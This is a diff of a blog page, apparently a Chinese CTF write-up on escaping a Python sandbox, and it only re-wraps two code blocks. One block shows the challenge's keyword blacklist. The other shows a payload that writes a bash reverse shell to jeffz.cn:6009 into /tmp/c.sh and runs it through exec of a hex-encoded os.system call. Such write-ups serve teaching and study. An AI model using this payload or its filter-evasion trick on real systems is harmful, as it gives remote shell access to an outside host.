@@ -188,10 +188,10 @@
 <p>得到flag</p>
 <p>其他方法：</p>
 <p>黑名单</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">black_list &#x3D; [ &#39;os&#39;, &#39;mro&#39;, &#39;request&#39;, &#39;args&#39;, &#39;eval&#39;, &#39;system&#39;,&#39;if&#39;, &#39;for&#39;,     &#39;subprocess&#39;,&#39;file&#39;,&#39;builtins&#39;,&#39;compile&#39;,&#39;execfile&#39;,&#39;from_pyfile&#39;,&#39;config&#39;,&#39;local&#39;,&#39;self&#39;,&#39;enter&#39;,&#39;%&#39;,&#39;or&#39;,&#39;ls&#39;,&#39;sys&#39;,&#39;globals&#39;,&#39;read&#39;,&#39;popen&#39;]</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">black_list &#x3D; [ &#39;os&#39;, &#39;mro&#39;, &#39;request&#39;, &#39;args&#39;, &#39;eval&#39;, &#39;system&#39;,&#39;if&#39;, &#39;for&#39;,     &#39;subprocess&#39;,&#39;file&#39;,</span><br><span class="line">&#39;builtins&#39;,&#39;compile&#39;,&#39;execfile&#39;,&#39;from_pyfile&#39;,&#39;config&#39;,&#39;local&#39;,&#39;self&#39;,&#39;enter&#39;,&#39;%&#39;,&#39;or&#39;,&#39;ls&#39;,&#39;sys&#39;,&#39;globals&#39;,&#39;read&#39;,&#39;popen&#39;]</span><br></pre></td></tr></table></figure>
 
 <p>没有过滤exec，但是因为<code>exec</code>不会返回命令执行的结果，所以我们利用上<code>open().write()</code>来反弹shell</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1,open(&#39;&#x2F;tmp&#x2F;c.sh&#39;,&#39;w&#39;).write(&#39;&#x2F;bin&#x2F;bash -i &gt; &#x2F;dev&#x2F;tcp&#x2F;jeffz.cn&#x2F;6009 0&gt;&amp;1&#39;),exec(bytes.fromhex(&#39;6f732e73797374656d28272f62696e2f62617368202f746d702f632e73682729&#39;).decode())</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1,open(&#39;&#x2F;tmp&#x2F;c.sh&#39;,&#39;w&#39;).write(&#39;&#x2F;bin&#x2F;bash -i &gt; &#x2F;dev&#x2F;tcp&#x2F;jeffz.cn&#x2F;6009 0&gt;&amp;1&#39;),exec(bytes.fromhex(&#39;6f732e73797374656d28272f62696e2</span><br><span class="line">f62617368202f746d702f632e73682729&#39;).decode())</span><br></pre></td></tr></table></figure>
 
 
             </div>
